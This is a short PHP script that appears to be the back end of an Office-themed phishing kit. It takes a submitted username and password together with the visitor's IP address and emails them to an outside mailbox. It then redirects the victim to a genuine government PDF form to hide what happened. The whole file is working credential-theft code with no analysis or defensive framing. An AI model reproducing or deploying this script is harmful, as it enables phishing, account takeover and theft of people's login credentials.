<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || office || :------\n";
$message .= "User: ".$_POST['ai']."\n";
$message .= "Password: ".$_POST['pr']."\n";
$message .= "----: || THckingE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="6a1l8ep92y@inscriptio.in";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://www.acq.osd.mil/dpap/ccap/cc/corhb/Files/Forms/SF%2026%20-%20Award-Contract.pdf");
?>